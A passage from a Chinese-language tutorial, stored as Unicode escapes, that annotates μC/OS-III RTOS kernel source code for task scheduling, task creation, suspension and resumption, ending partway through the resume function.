\u4e2d\u53ef\u5229\u7528OSIdleCtr\u53d8\u91cf\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd \uff09 10. \u6e90\u7801\u5206\u6790 # \u4ee5\u4e0b\u5185\u5bb9\u53c2\u8003\u81ea \u300a\u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u3002 10.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 # \u9996\u5148\u770b\u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 OSSched() void OSSched (void) { CPU_SR_ALLOC(); // \u8fd8\u5728\u4e2d\u65ad\u4e2d\uff0c\u4e0d\u80fd\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 if (OSIntNestingCtr > (OS_NESTING_CTR)0) { return; } // \u8c03\u5ea6\u5668\u9501\u4f4f\u4e86\uff0c\u4e0d\u80fd\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 if (OSSchedLockNestingCtr > (OS_NESTING_CTR)0) { return; } // \u5173\u4e2d\u65ad CPU_INT_DIS(); // \u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7 OSPrioHighRdy = OS_PrioGetHighest(); // \u627e\u5230\u8be5\u4f18\u5148\u7ea7\u4e0b\u5bf9\u5e94\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1 OSTCBHighRdyPtr = OSRdyList[OSPrioHighRdy].HeadPtr; // \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u662f\u4e00\u6837\u7684 if (OSTCBHighRdyPtr == OSTCBCurPtr) { CPU_INT_EN(); return; } #if OS_CFG_TASK_PROFILE_EN > 0u // \u88ab\u5207\u6362\u5230\u7684\u4efb\u52a1\u7684\u5207\u6362\u6b21\u6570\u52a01 OSTCBHighRdyPtr->CtxSwCtr++; #endif // \u603b\u5f97\u4efb\u52a1\u5207\u6362\u6b21\u6570\u52a01 OSTaskCtxSwCtr++; // \u8c03\u7528\u4efb\u52a1\u5207\u6362\u7684\u5b8f OS_TASK_SW(); // \u4f7f\u80fd\u4e2d\u65ad CPU_INT_EN(); } \u9996\u5148\u5982\u679c\u662f\u5728\u4e2d\u65ad\u4e2d\u6216\u8005\u8c03\u5ea6\u5668\u88ab\u9501\u4f4f\uff0c\u5c31\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884c\u8c03\u5ea6\u76f4\u63a5\u9000\u51fa\u3002\u4e2d\u65ad\u7684\u4ee3\u7801\u4e00\u822c\u505a\u7684\u90fd\u662f\u91cd\u8981\u5e76\u4e14\u6bd4\u8f83\u7b80\u5355\u7684\u4e8b\u60c5\uff0c\u4e2d\u65ad\u5fc5\u987b\u5148\u6267\u884c\u5b8c\u518d\u53bb\u6267\u884c\u4efb\u52a1\u76f8\u5173\u4ee3\u7801\u3002\u5982\u679c\u5728\u4e2d\u65ad\u4e2d\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\uff0c\u4e0d\u4ec5\u4ec5\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\uff0c\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e0d\u80fd\u53ca\u65f6\u8fd0\u884c\uff0c\u800c\u4e14\u53ef\u80fd\u4f1a\u4ea7\u751f\u5f02\u5e38\uff08\u5173\u4e8e\u4e2d\u65ad\u4e2d\u8fdb\u884c\u4efb\u52a1\u5207\u6362\u5f15\u53d1\u7684\u5f02\u5e38\u5728\u7f51\u4e0a\u6709\u76f8\u5173\u7684\u6587\u7ae0\u2014\u2014\u300a\u7834\u574fSTM32\u4e2d\u65ad\u673a\u5236\u5f15\u53d1\u7684\u5f02\u5e38\u300b\u8fdb\u884c\u5206\u6790\uff0c\u5927\u5bb6\u53ef\u4ee5\u53bb\u770b\u4e0b\uff09\u3002 \u6839\u636e\u524d\u9762\u7684\u7b2c12\u7ae0\u7b2c13\u7ae0\u5173\u4e8e\u5c31\u7eea\u5217\u8868\u7684\u77e5\u8bc6\u5f88\u5bb9\u6613\u5c31\u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u54ea\u4e00\u4e2a\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u4e14\u8be5\u4f18\u5148\u7ea7\u54ea\u4e2a\u4efb\u52a1\u5e94\u8be5\u8fdb\u884c\u5207\u6362\u6267\u884c\uff0c\u7136\u540e\u5224\u65ad\u8be5\u4efb\u52a1\u662f\u4e0d\u662f\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\u5c31\u4e0d\u7528\u8fdb\u884c\u8c03\u5ea6\uff0c\u5982\u679c\u4e0d\u540c\u5148\u5bf9\u4efb\u52a1\u5207\u6362\u7684\u6b21\u6570 OSTCBHighRdyPtr->CtxSwCtr \u8ddf\u7cfb\u7edf\u603b\u7684\u4efb\u52a1\u5207\u6362\u7684\u6b21\u6570 OSTaskCtxSwCtr \u8fdb\u884c\u66f4\u65b0\uff0c\u63a5\u7740\u6267\u884c\u8c03\u5ea6\uff0c\u8fd9\u4e2a\u65f6\u5019\u53ea\u662f\u8c03\u7528\u4e86\u5b8f OS_TASK_SW() \u3002 \u6709\u4e9b\u8bfb\u8005\u53ef\u80fd\u4f1a\u60f3\uff0c\u539f\u6765\u4efb\u52a1\u5207\u6362\u8fd9\u4e48\u7b80\u5355\uff0c\u5c31\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u5b8f\uff0c\u770b\u4f3c\u7b80\u5355\u7684\u4e1c\u897f\u5176\u5b9e\u4e0d\u7b80\u5355\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5b8f\u53ea\u662f\u76f8\u5f53\u4e00\u4e2a\u5bfc\u706b\u7d22\uff0c\u540e\u9762\u4f1a\u201c\u5f15\u7206\u201d\u5176\u4ed6\u7684\u64cd\u4f5c 1 \u3002 10.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 # \u4efb\u52a1\u521b\u5efa\u51fd\u6570OSTaskCreate void OSTaskCreate (OS_TCB *p_tcb, CPU_CHAR *p_name, OS_TASK_PTR p_task, void *p_arg, OS_PRIO prio, CPU_STK *p_stk_base, CPU_STK_SIZE stk_limit, CPU_STK_SIZE stk_size, OS_MSG_QTY q_size, OS_TICK time_quanta, void *p_ext, OS_OPT opt, OS_ERR *p_err) { CPU_STK_SIZE i; #if OS_CFG_TASK_REG_TBL_SIZE > 0u OS_OBJ_QTY reg_nbr; #endif CPU_STK *p_sp; CPU_STK *p_stk_limit; CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u662f\u5426\u542f\u52a8\u5b89\u5168\u5173\u952e #ifdef OS_SAFETY_CRITICAL_IEC61508 /* \u4e00\u65e6\u8c03\u7528OSSafetyCriticalStart\uff0cOSSafetyCriticalStartFlag\u5c31\u88ab\u7f6e\u4e3a36 DEF_TRUE,\u4e0d\u518d\u5141\u8bb8\u521b\u5efa\u5185\u6838\u5bf9\u8c61\u3002*/ if (OSSafetyCriticalStartFlag == DEF_TRUE) { *p_err = OS_ERR_ILLEGAL_CREATE_RUN_TIME; return; } #endif // \u4e0d\u80fd\u5728\u4e2d\u65ad\u4e2d\u8c03\u7528\u521b\u5efa\u4efb\u52a1\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_CREATE_ISR; return; } #endif // \u8fdb\u884c\u53c2\u6570\u68c0\u6d4b #if OS_CFG_ARG_CHK_EN > 0u // \u68c0\u6d4b\u53c2\u6570p_tcb\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_tcb == (OS_TCB *)0) { *p_err = OS_ERR_TCB_INVALID; return; } // \u68c0\u6d4b\u53c2\u6570p_task\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_task == (OS_TASK_PTR)0) { *p_err = OS_ERR_TASK_INVALID; return; } // \u68c0\u6d4b\u53c2\u6570p_stk_base\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_stk_base == (CPU_STK *)0) { *p_err = OS_ERR_STK_INVALID; return; } // \u5806\u6808\u81f3\u5c11\u5e94\u8be5\u5927\u4e8e\u6211\u4eec\u8bbe\u5b9a\u7684\u6700\u5c0f\u503cOSCfg_StkSizeMin if (stk_size < OSCfg_StkSizeMin) { *p_err = OS_ERR_STK_SIZE_INVALID; return; } // \u9650\u5236\u7684\u5806\u6808\u5927\u5c0f\u80af\u5b9a\u4e0d\u80fd\u8d85\u8fc7\u6574\u4e2a\u5806\u6808\u7684\u5927\u5c0f if (stk_limit >= stk_size) { *p_err = OS_ERR_STK_LIMIT_INVALID; return; } // \u4efb\u52a1\u4f18\u5148\u7ea7\u4e0d\u80fd\u5927\u4e8e\u8bbe\u7f6e\u7684\u6700\u5927\u4f18\u5148\u7ea7 if (prio >= OS_CFG_PRIO_MAX) { *p_err = OS_ERR_PRIO_INVALID; return; } #endif // \u5982\u679c\u5141\u8bb8\u5ef6\u8fdf\u63d0\u4ea4\uff0c\u90a3\u4e48\u4f18\u5148\u7ea7\u4e3a0\u7684\u4efb\u52a1\u662f\u5ef6\u8fdf\u63d0\u4ea4\u7684\uff0c\u4efb\u52a1\u4e0d\u80fd\u8bbe\u7f6e\u4e3a\u6b64\u4f18\u5148\u7ea7 #if OS_CFG_ISR_POST_DEFERRED_EN > 0u if (prio == (OS_PRIO)0) { if (p_tcb != &OSIntQTaskTCB) { *p_err = OS_ERR_PRIO_INVALID; return; } } #endif // \u6700\u4f4e\u4f18\u5148\u7ea7\u4e3a\u7a7a\u95f2\u4efb\u52a1\uff0c\u4efb\u52a1\u4e0d\u80fd\u8bbe\u7f6e\u4e3a\u6b64\u4f18\u5148\u7ea7 if (prio == (OS_CFG_PRIO_MAX - 1u)) { if (p_tcb != &OSIdleTaskTCB) { *p_err = OS_ERR_PRIO_INVALID; return; } } // \u521d\u59cb\u5316\u4efb\u52a1\u63a7\u5236\u5757 OS_TaskInitTCB(p_tcb); *p_err = OS_ERR_NONE; // \u521b\u5efa\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u5982\u679c\u6709\u9009\u9879OS_OPT_TASK_STK_CHK\u548cOS_OPT_TASK_STK_CLR\uff0c // \u5219\u4ece\u4f4e\u5730\u5740\u5f00\u59cb\u5c06\u6240\u6709\u7684\u5806\u6808\u7a7a\u95f4\u521d\u59cb\u5316\u4e3a0\uff0c\u540e\u9762\u53ef\u4ee5\u8ba1\u7b97\u6700\u5927\u7684\u5806\u6808\u4f7f\u7528\u60c5\u51b5 if ((opt & OS_OPT_TASK_STK_CHK) != (OS_OPT)0) { if ((opt & OS_OPT_TASK_STK_CLR) != (OS_OPT)0) { p_sp = p_stk_base; for (i = 0u; i < stk_size; i++) { *p_sp = (CPU_STK)0; p_sp++; } } } // \u6839\u636e\u5806\u6808\u589e\u957f\u65b9\u5411\uff0c\u8ba1\u7b97\u9650\u5236\u5806\u6808\u7684\u90a3\u4e2a\u5730\u5740 #if (CPU_CFG_STK_GROWTH == CPU_STK_GROWTH_HI_TO_LO) p_stk_limit = p_stk_base + stk_limit; #else p_stk_limit = p_stk_base + (stk_size - 1u) - stk_limit; #endif // \u5bf9\u5806\u6808\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u521d\u59cb\u5316\u7684\u5185\u5bb9\u5c06\u5728\u7b2c\u4e00\u6b21\u8fdb\u884c\u4efb\u52a1\u5207\u6362\u7684\u65f6\u5019\u6062\u590d\u4e3a\u5bc4\u5b58\u5668\u7684\u503c // \u6700\u540e\u8fd4\u56de\u521d\u59cb\u5316\u5806\u6808\u540e\u8fd4\u56de\u5806\u6808\u6307\u9488\u3002 p_sp = OSTaskStkInit(p_task, p_arg, p_stk_base, p_stk_limit, stk_size, opt); // \u4fdd\u5b58\u4efb\u52a1\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20TaskEntryAddr p_tcb->TaskEntryAddr = p_task; // \u4fdd\u5b58\u4efb\u52a1\u53c2\u6570\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20TaskEntryArg p_tcb->TaskEntryArg = p_arg; // \u4fdd\u5b58\u4efb\u52a1\u7684\u540d\u79f0\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20NamePtr p_tcb->NamePtr = p_name; // \u4fdd\u5b58\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20Prio p_tcb->Prio = prio; // \u4fdd\u5b58\u4efb\u52a1\u7684\u5806\u6808\u6307\u9488\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkPtr p_tcb->StkPtr = p_sp; // \u4fdd\u5b58\u4efb\u52a1\u7684\u5806\u6808\u9650\u5236\u589e\u957f\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkLimitPtr p_tcb->StkLimitPtr = p_stk_limit; // \u4fdd\u5b58\u4efb\u52a1\u7684\u65f6\u95f4\u7247\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20time_quanta p_tcb->TimeQuanta = time_quanta; // \u5141\u8bb8\u8fdb\u884c\u65f6\u95f4\u7247\u8f6e\u8f6c\u8c03\u5ea6 #if OS_CFG_SCHED_ROUND_ROBIN_EN > 0u // \u5982\u679c\u8bbe\u7f6e\u65f6\u95f4\u7247time_quanta\u4e3a0\uff0c\u53c2\u6570\u65f6\u95f4\u7247\u8ba1\u6570\u503c\u4e3a\u9ed8\u8ba4\u7684OSSchedRoundRobinDfltTimeQuanta // \u4e3aOSCfg_TickRate_Hz/10u\uff0c\u5373100\uff0c\u5426\u5219\u4e3a\u53c2\u6570\u7684\u8bbe\u7f6e\u3002 if (time_quanta == (OS_TICK)0) { p_tcb->TimeQuantaCtr = OSSchedRoundRobinDfltTimeQuanta; } else { p_tcb->TimeQuantaCtr = time_quanta; } #endif // \u4fdd\u5b58\u4efb\u52a1\u7684\u62d3\u5c55\u5185\u5bb9\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20ExtPtr\uff0c\u8be5\u53c2\u6570\u4e3a\u65e0\u786e\u5207\u7c7b\u578b\u6307\u9488 p_tcb->ExtPtr = p_ext; // \u4fdd\u5b58\u4efb\u52a1\u5806\u6808\u7684\u4f4e\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkBasePtr p_tcb->StkBasePtr = p_stk_base; // \u4fdd\u5b58\u4efb\u52a1\u5806\u6808\u7684\u5927\u5c0f\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkSize p_tcb->StkSize = stk_size; // \u4fdd\u5b58\u4efb\u52a1\u521b\u5efa\u65f6\u7684\u9009\u9879\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20Opt p_tcb->Opt = opt; // \u5982\u679c\u5141\u8bb8\u4f7f\u7528\u4efb\u52a1\u201c\u5bc4\u5b58\u5668\u201d #if OS_CFG_TASK_REG_TBL_SIZE > 0u // \u521d\u59cb\u5316\u4efb\u52a1\u7684OS_CFG_TASK_REG_TBL_SIZE\u4e2a\u201c\u5bc4\u5b58\u5668\u201d\u90fd\u4e3a0\u3002 // OS_CFG_TASK_REG_TBL_SIZE\u9ed8\u8ba4\u503c\u4e3a1 for (reg_nbr = 0u; reg_nbr < OS_CFG_TASK_REG_TBL_SIZE; reg_nbr++) { p_tcb->RegTbl[reg_nbr] = (OS_REG)0; } #endif // \u5982\u679c\u5141\u8bb8\u4f7f\u7528\u4efb\u52a1\u6d88\u606f\u961f\u5217 #if OS_CFG_TASK_Q_EN > 0u // \u521d\u59cb\u5316\u4efb\u52a1\u6d88\u606f\u961f\u5217 OS_MsgQInit(&p_tcb->MsgQ, q_size); #endif // \u8c03\u7528\u4efb\u52a1\u521b\u5efa\u65f6\u7684\u56de\u8c03\u51fd\u6570OSTaskCreateHook\uff0c\u7528\u6237\u53ef\u4ee5\u5bf9\u51fd\u6570 // OS_AppTaskCreateHookPtr\u8fdb\u884c\u7f16\u5199 OSTaskCreateHook(p_tcb); OS_CRITICAL_ENTER(); // \u7f6e\u5c31\u7eea\u4f18\u5148\u7ea7\u4f4d\u6620\u50cf\u8868\u4e2d\u76f8\u5e94\u4f18\u5148\u7ea7\u5904\u4e8e\u5c31\u7eea\u72b6\u6001 OS_PrioInsert(p_tcb->Prio); // \u5c06\u65b0\u521b\u5efa\u7684\u4efb\u52a1\u63d2\u5165\u5c31\u7eea\u5217\u8868\u672b\u5c3e OS_RdyListInsertTail(p_tcb); // \u5982\u679c\u5141\u8bb8\u8c03\u8bd5\u7684\u5b8f\uff08\u4e3b\u8981\u5c06\u5404\u79cd\u5185\u6838\u5bf9\u8c61\u4e32\u6210\u53cc\u5411\u94fe\u8868\uff0c\u4ee5\u65b9\u4fbf\u8c03\u8bd5\uff09 #if OS_CFG_DBG_EN > 0u // \u5c31\u5c06\u4efb\u52a1\u6dfb\u52a0\u5230\u4efb\u52a1\u7684\u53cc\u5411\u94fe\u8868\u4e2d OS_TaskDbgListAdd(p_tcb); #endif // \u66f4\u65b0\u4efb\u52a1\u6570\u76ee OSTaskQty++; /* Increment the #tasks counter */ // \u53ea\u6709\u7cfb\u7edf\u542f\u52a8\u4e86\u624d\u5f00\u59cb\u540e\u9762\u7684\u4efb\u52a1\u8c03\u5ea6 if (OSRunning != OS_STATE_OS_RUNNING) { // Return if multitasking has not started OS_CRITICAL_EXIT(); return; } OS_CRITICAL_EXIT_NO_SCHED(); // \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 OSSched(); } 10.3. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 # \u4efb\u52a1\u6302\u8d77\u51fd\u6570OSTaskSuspend // \u662f\u5426\u5305\u542b\u6302\u8d77\u4efb\u52a1\u6216\u8005\u53d6\u6d88\u6302\u8d77\u4efb\u52a1\u7684\u76f8\u5173\u4ee3\u7801 #if OS_CFG_TASK_SUSPEND_EN > 0u void OSTaskSuspend (OS_TCB *p_tcb, OS_ERR *p_err) { CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u4e2d\u65ad\u4e2d\u4e0d\u5141\u8bb8\u8c03\u7528\u4efb\u52a1\u6302\u8d77\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_SUSPEND_ISR; return; } #endif // \u4e0d\u80fd\u6302\u8d77\u7a7a\u95f2\u4efb\u52a1 if (p_tcb == &OSIdleTaskTCB) { *p_err = OS_ERR_TASK_SUSPEND_IDLE; return; } // \u662f\u5426\u5141\u8bb8\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4 #if OS_CFG_ISR_POST_DEFERRED_EN > 0u // \u5982\u679c\u6302\u8d77\u7684\u662f\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\uff0c\u5219\u8fd4\u56de\u9519\u8bef if (p_tcb == &OSIntQTaskTCB) { *p_err = OS_ERR_TASK_SUSPEND_INT_HANDLER; return; } #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u5982\u679cp_tcb\u53c2\u6570\u4e3a\u7a7a\u6307\u9488\uff0c\u5219\u9ed8\u8ba4\u6302\u8d77\u7684\u662f\u5f53\u524d\u4efb\u52a1 if (p_tcb == (OS_TCB *)0) { p_tcb = OSTCBCurPtr; } // \u5982\u679c\u6302\u8d77\u7684\u662f\u5f53\u524d\u4efb\u52a1\uff0c\u540e\u9762\u5c31\u8981\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\uff0c\u6240\u4ee5\u8981\u68c0\u67e5\u8c03\u5ea6\u5668\u662f\u5426\u88ab\u9501\u4f4f if (p_tcb == OSTCBCurPtr) { if (OSSchedLockNestingCtr > (OS_NESTING_CTR)0) { CPU_CRITICAL_EXIT(); *p_err = OS_ERR_SCHED_LOCKED; return; } } *p_err = OS_ERR_NONE; // \u9488\u5bf9\u6302\u8d77\u4efb\u52a1\u7684\u4e0d\u540c\u72b6\u6001\u8fdb\u884c\u4e0d\u540c\u7684\u5904\u7406 switch (p_tcb->TaskState) { // \u5c31\u7eea\u72b6\u6001 case OS_TASK_STATE_RDY: /*\u5728\u5141\u8bb8\u4e2d\u65ad\u5ef6\u8fdf\u7684\u60c5\u51b5\u4e0b\uff0c\u5f00\u4e2d\u65ad\u5e76\u4e14\u9501\u4f4f\u8c03\u5ea6\u5668\uff0c\u56e0\u4e3a\u4e0b\u9762\u64cd\u4f5c\u7684\u53d8\u91cf \u4e0d\u53ef\u80fd\u5728\u4e2d\u65ad\u4e2d\u88ab\u4f7f\u7528\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u9501\u4f4f\u8c03\u5ea6\u5668\u5373\u53ef\u3002\u5982\u679c\u4e0d\u5141\u8bb8\u4e2d\u65ad \u5ef6\u8fdf\uff0c\u8fd9\u91cc\u4f1a\u53d8\u6210\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u5b9e\u9645\u4e0a\u8fd9\u662f\u4e2a\u7a7a\u5b8f\uff0c\u56e0\u4e3a\u524d\u9762\u5df2\u7ecf\u5173\u4e2d\u65ad*/ OS_CRITICAL_ENTER_CPU_CRITICAL_EXIT(); // \u4efb\u52a1\u72b6\u6001\u53d8\u4e3a\u6302\u8d77\u72b6\u6001 p_tcb->TaskState = OS_TASK_STATE_SUSPENDED; // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u53d8\u4e3a1\uff0c\u4e4b\u524d\u6ca1\u6709\u88ab\u6302\u8d77 p_tcb->SuspendCtr = (OS_NESTING_CTR)1; // \u5c06\u4efb\u52a1\u4ece\u5c31\u7eea\u5217\u8868\u4e2d\u8131\u79bb OS_RdyListRemove(p_tcb); // \u9000\u51fa\u4e34\u754c\u6bb5 OS_CRITICAL_EXIT_NO_SCHED(); break; // \u5ef6\u8fdf\u72b6\u6001 case OS_TASK_STATE_DLY: p_tcb->TaskState = OS_TASK_STATE_DLY_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u6302\u8d77\u7684\u72b6\u6001 case OS_TASK_STATE_PEND: p_tcb->TaskState = OS_TASK_STATE_PEND_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u6b63\u5728\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\uff0c\u5e76\u4e14\u6709\u65f6\u95f4\u9650\u5236\u7684\u65f6\u5019 // \u6ce8\uff1aOS_STATUS_PEND_TIMEOUT\u8ddfOS_TASK_STATE_PEND_TIMEOUT\u7684\u542b\u4e49\u4e0d\u540c case OS_TASK_STATE_PEND_TIMEOUT: p_tcb->TaskState = OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u4e4b\u524d\u5df2\u7ecf\u662f\u6302\u8d77\u72b6\u6001\uff0c\u53ea\u9700\u5c06\u5d4c\u5957\u5c42\u6570+1 case OS_TASK_STATE_SUSPENDED: case OS_TASK_STATE_DLY_SUSPENDED: case OS_TASK_STATE_PEND_SUSPENDED: case OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED: p_tcb->SuspendCtr++; CPU_CRITICAL_EXIT(); break; default: CPU_CRITICAL_EXIT(); *p_err = OS_ERR_STATE_INVALID; return; } // \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 OSSched(); } #endif 10.4. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570 # \u6062\u590d\u6302\u8d77\u4efb\u52a1\u51fd\u6570OSTaskResume // \u662f\u5426\u5305\u542b\u6302\u8d77\u4efb\u52a1\u6216\u8005\u53d6\u6d88\u6302\u8d77\u4efb\u52a1\u7684\u76f8\u5173\u4ee3\u7801 #if OS_CFG_TASK_SUSPEND_EN > 0u void OSTaskResume (OS_TCB *p_tcb, OS_ERR *p_err) { CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u4e2d\u65ad\u4e2d\u4e0d\u5141\u8bb8\u8c03\u7528\u4efb\u52a1\u6302\u8d77\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_RESUME_ISR; return; } #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u662f\u5426\u8fdb\u884c\u53c2\u6570\u68c0\u6d4b #if OS_CFG_ARG_CHK_EN > 0u /*\u5982\u679c\u53c2\u6570p_tcb\u662f\u7a7a\u6307\u9488\u6216\u8005\u6307\u5411\u5f53\u524d\u4efb\u52a1\u7684\u6307\u9488\uff0c\u90a3\u4e48\u4e0d\u80fd\u7ee7\u7eed\u8fdb\u884c\u6062\u590d\u64cd\u4f5c \u56e0\u4e3a\u5f53\u524d\u4efb\u52a1\u6b63\u5728\u8fd0\u884c\uff0c\u6ca1\u6709\u5904\u4e8e\u6302\u8d77\u72b6\u6001\u3002*/ if ((p_tcb == (OS_TCB *)0) || (p_tcb == OSTCBCurPtr)) { CPU_CRITICAL_EXIT(); *p_err = OS_ERR_TASK_RESUME_SELF; return; } #endif *p_err = OS_ERR_NONE; // \u6839\u636e\u4efb\u52a1\u7684\u72b6\u6001\u8fdb\u884c\u64cd\u4f5c switch (p_tcb->TaskState) { // \u5982\u679c\u4efb\u52a1\u6ca1\u6709\u5904\u4e8e\u6302\u8d77\u7684\u76f8\u5173\u72b6\u6001\uff0c\u5c31\u76f4\u63a5\u9000\u51fa case OS_TASK_STATE_RDY: case OS_TASK_STATE_DLY: case OS_TASK_STATE_PEND: case OS_TASK_STATE_PEND_TIMEOUT: CPU_CRITICAL_EXIT(); *p_err = OS_ERR_TASK_NOT_SUSPENDED; break; // \u5982\u679c\u4efb\u52a1\u53ea\u662f\u5904\u4e8e\u6302\u8d77\u72b6\u6001 case OS_TASK_STATE_SUSPENDED: // \u5f00\u4e2d\u65ad\u7136\u540e\u9501\u4f4f\u8c03\u5ea6\u5668 OS_CRITICAL_ENTER_CPU_CRITICAL_EXIT(); // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u51cf1 p_tcb->SuspendCtr--; // \u5982\u679c\u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u4e3a0\uff0c\u90a3\u4e48\u5c31\u5c06\u4efb\u52a1\u7f6e\u4e8e\u5c31\u7eea\u72b6\u6001 if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_RDY; OS_TaskRdy(p_tcb); } // \u51cf\u5c11\u8c03\u5ea6\u5668\u5d4c\u5957\u5c42\u6570\uff0c\u5373\u9000\u51fa\u4e34\u754c\u6bb5 OS_CRITICAL_EXIT_NO_SCHED(); break; // \u4efb\u52a1\u5904\u4e8e\u5ef6\u65f6\u548c\u6302\u8d77\u4e24\u79cd\u72b6\u6001 case OS_TASK_STATE_DLY_SUSPENDED: // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u51cf1 p_tcb->SuspendCtr--; // \u5982\u679c\u5d4c\u5957\u5c42\u6570\u5df2\u7ecf\u4e3a0\uff0c\u8bf4\u660e\u5df2\u7ecf\u8131\u79bb\u6302\u8d77\u72b6\u6001\uff0c\u5269\u4e0b\u7b49\u5f85\u72b6\u6001 if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_DLY; } // \u9000\u51fa\u4e34\u754c\u6bb5 CPU_CRITICAL_EXIT(); break; 